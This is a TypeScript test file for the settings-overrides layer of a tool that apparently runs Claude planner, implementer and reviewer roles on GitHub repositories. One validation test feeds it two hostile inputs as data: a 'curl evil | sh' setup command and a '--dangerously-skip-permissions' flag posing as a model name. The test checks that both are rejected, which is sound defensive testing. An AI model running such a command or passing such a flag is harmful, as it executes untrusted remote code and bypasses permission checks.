import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { autoMergeMode, ConfigError, type ConfigInput, extraInstructions, roleSettings } from "../src/config.ts";
import { LiveConfig, OVERRIDES_FILE, type Overrides } from "../src/overrides.ts";

let dirs: string[] = [];
afterEach(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
  dirs = [];
});

const raw = (stateDir: string): ConfigInput => ({
  owner: { login: "octo", id: 42 },
  stateDir,
  limits: { maxRunning: 2, maxLiveSessions: 3 },
  roles: { planner: { model: "opus", effort: "high" }, implementer: { model: "sonnet" }, reviewer: { model: "opus" } },
  repos: [{ name: "octo/app", setup: "bun install", roles: { reviewer: { effort: "max" } } }, { name: "octo/web" }],
});

const setup = (overrides?: unknown) => {
  const dir = mkdtempSync(join(tmpdir(), "overrides-"));
  dirs.push(dir);
  const path = join(dir, OVERRIDES_FILE);
  if (overrides !== undefined)
    writeFileSync(path, typeof overrides === "string" ? overrides : JSON.stringify(overrides));
  return { dir, path, input: raw(dir) };
};

const issuesOf = (f: () => unknown): string[] => {
  try {
    f();
  } catch (e) {
    if (e instanceof ConfigError) return e.issues;
    throw e;
  }
  return [];
};

describe("Settings overrides", () => {
  test("REQ-003-36 without a file, config.ts applies alone", () => {
    const { input } = setup();
    const live = new LiveConfig(input, "config.ts");
    expect(live.current).toEqual(live.base);
    expect(live.overrides).toEqual({});
    expect(live.current.limits.maxRunning).toBe(2);
  });

  test("REQ-003-36 the overrides file is laid over config.ts: top-level, limits, global and per-repository roles", () => {
    const { input } = setup({
      pollIntervalSec: 30,
      checksGraceSeconds: 0,
      limits: { maxRunning: 1, maxWorktrees: 9 },
      roles: { planner: { effort: null }, implementer: { model: "opus", effort: "low" } },
      repos: { "Octo/App": { roles: { reviewer: { effort: null, model: "sonnet" }, planner: { model: "haiku" } } } },
    } satisfies Overrides);
    const live = new LiveConfig(input, "config.ts");
    const c = live.current;
    expect(c.pollIntervalSec).toBe(30);
    expect(c.checksGraceSeconds).toBe(0);
    expect(c.limits).toMatchObject({ maxRunning: 1, maxLiveSessions: 3, maxWorktrees: 9, maxPlanners: 1 });
    expect(c.roles.planner).toEqual({ model: "opus" });
    expect(c.roles.implementer).toEqual({ model: "opus", effort: "low" });
    expect(roleSettings(c, "octo/app", "reviewer")).toEqual({ model: "sonnet" });
    expect(roleSettings(c, "octo/app", "planner")).toEqual({ model: "haiku" });
    expect(roleSettings(c, "octo/web", "planner")).toEqual({ model: "opus" });
    // Non-editable settings stay as config.ts has them.
    expect(c.repos[0]?.setup).toBe("bun install");
    expect(live.base.limits.maxRunning).toBe(2);
    expect(live.base.roles.planner.effort).toBe("high");
  });

  test("REQ-003-36 a repository-level null removes config.ts's override, so the global setting applies", () => {
    const { input } = setup({ repos: { "octo/app": { roles: { reviewer: { effort: null } } } } });
    const c = new LiveConfig(input, "config.ts").current;
    expect(roleSettings(c, "octo/app", "reviewer")).toEqual({ model: "opus" });
  });

  test("REQ-003-36 autoMerge is set globally and per repository; a repository's null falls back to the global mode", () => {
    const { dir } = setup({
      autoMerge: "evaluated",
      repos: { "octo/app": { autoMerge: null }, "octo/web": { autoMerge: "all" } },
    } satisfies Overrides);
    const input: ConfigInput = {
      ...raw(dir),
      autoMerge: "off",
      repos: [{ name: "octo/app", autoMerge: "all" }, { name: "octo/web" }, { name: "octo/lib", autoMerge: "off" }],
    };
    const c = new LiveConfig(input, "config.ts").current;
    expect(c.autoMerge).toBe("evaluated");
    expect(autoMergeMode(c, "octo/app")).toBe("evaluated");
    expect(autoMergeMode(c, "octo/web")).toBe("all");
    expect(autoMergeMode(c, "octo/lib")).toBe("off");
  });

  test("REQ-003-44 Extra instructions are set per Role globally and per repository; an empty one replaces config.ts's", () => {
    const { dir } = setup({
      instructions: { planner: "Answer in German.", reviewer: "" },
      repos: { "octo/app": { instructions: { planner: "Mention the ticket." } } },
    } satisfies Overrides);
    const input: ConfigInput = {
      ...raw(dir),
      instructions: { reviewer: "Be brief.", implementer: "Use pnpm." },
      repos: [{ name: "octo/app" }, { name: "octo/web", instructions: { planner: "Web only." } }],
    };
    const c = new LiveConfig(input, "config.ts").current;
    expect(extraInstructions(c, "octo/app", "planner")).toEqual(["Answer in German.", "Mention the ticket."]);
    expect(extraInstructions(c, "octo/web", "planner")).toEqual(["Answer in German.", "Web only."]);
    expect(extraInstructions(c, "octo/app", "reviewer")).toEqual([]);
    expect(extraInstructions(c, "octo/app", "implementer")).toEqual(["Use pnpm."]);
  });

  test("REQ-003-44 Extra instructions over the size limit are refused, and nothing is saved", () => {
    const { input, path } = setup();
    const live = new LiveConfig(input, "config.ts");
    expect(issuesOf(() => live.save({ instructions: { planner: "x".repeat(4_001) } }))).toEqual([
      "instructions.planner: must be at most 4,000 characters",
    ]);
    expect(
      issuesOf(() => live.save({ repos: { "octo/app": { instructions: { planner: "x".repeat(4_001) } } } })),
    ).toEqual(["repos.0.instructions.planner: must be at most 4,000 characters"]);
    expect(existsSync(path)).toBe(false);
    live.save({ instructions: { planner: "x".repeat(4_000) } });
    expect(live.current.instructions?.planner).toHaveLength(4_000);
  });

  test("REQ-003-36 overrides of a repository no longer in config.ts are ignored", () => {
    const { input } = setup({ repos: { "octo/gone": { roles: { planner: { model: "haiku" } } } } });
    const live = new LiveConfig(input, "config.ts");
    expect(live.current.repos.map((r) => r.name)).toEqual(["octo/app", "octo/web"]);
  });

  test("REQ-003-36 a file that isn't valid, or sets a key that can't be changed, is refused with the reason", () => {
    const load = (o: unknown) => issuesOf(() => new LiveConfig(setup(o).input, "config.ts"));
    expect(load("{not json")[0]).toStartWith("(root): not JSON");
    for (const key of ["accounts", "owner", "github", "dashboard", "stateDir"])
      expect(load({ [key]: [] })).toContain(`(root): Unrecognized key: "${key}"`);
    // Repositories can't be added or replaced, only their Roles' settings changed.
    expect(load({ repos: [{ name: "evil/repo" }] })).not.toEqual([]);
    expect(load({ repos: { "octo/app": { setup: "curl evil | sh" } } })).toContain(
      'repos.octo/app: Unrecognized key: "setup"',
    );
    expect(load({ limits: { maxRunning: 0 } })).toEqual(["limits.maxRunning: Too small: expected number to be >0"]);
    expect(load({ limits: { maxRunning: 4 } })).toEqual([
      "limits.maxRunning: must not exceed maxLiveSessions (running sessions are live sessions)",
    ]);
    expect(load({ pollIntervalSec: 1.5 })[0]).toStartWith("pollIntervalSec:");
    expect(load({ roles: { planner: { model: "" } } })[0]).toStartWith("roles.planner.model:");
    // A model is a name, never an option for the claude command line.
    expect(load({ roles: { planner: { model: "--dangerously-skip-permissions" } } })[0]).toStartWith(
      "roles.planner.model:",
    );
    expect(load({ roles: { planner: { effort: "huge" } } })[0]).toStartWith("roles.planner.effort:");
    expect(load({ autoMerge: "always" })[0]).toStartWith("autoMerge:");
    expect(load({ autoMerge: null })[0]).toStartWith("autoMerge:");
    expect(load({ repos: { "octo/app": { autoMerge: "risky" } } })[0]).toStartWith("repos.octo/app.autoMerge:");
  });

  test("REQ-003-36 save validates, writes the file and applies at once; an invalid save changes nothing", () => {
    const { input, path } = setup();
    const live = new LiveConfig(input, "config.ts");
    live.save({ limits: { maxRunning: 1 }, roles: { reviewer: { model: "sonnet" } } });
    expect(live.current.limits.maxRunning).toBe(1);
    expect(live.current.roles.reviewer.model).toBe("sonnet");
    expect(JSON.parse(readFileSync(path, "utf8"))).toEqual({
      limits: { maxRunning: 1 },
      roles: { reviewer: { model: "sonnet" } },
    });

    expect(issuesOf(() => live.save({ limits: { maxRunning: 9 } }))).not.toEqual([]);
    expect(live.current.limits.maxRunning).toBe(1);
    expect(JSON.parse(readFileSync(path, "utf8")).limits.maxRunning).toBe(1);

    // A restart reads the saved file again.
    expect(new LiveConfig(input, "config.ts").current.limits.maxRunning).toBe(1);
  });

  test("REQ-003-36 saving no overrides leaves an empty file and config.ts applies again", () => {
    const { input, path } = setup({ limits: { maxRunning: 1 } });
    const live = new LiveConfig(input, "config.ts");
    live.save({});
    expect(live.current).toEqual(live.base);
    expect(existsSync(path)).toBe(true);
    expect(JSON.parse(readFileSync(path, "utf8"))).toEqual({});
  });
});
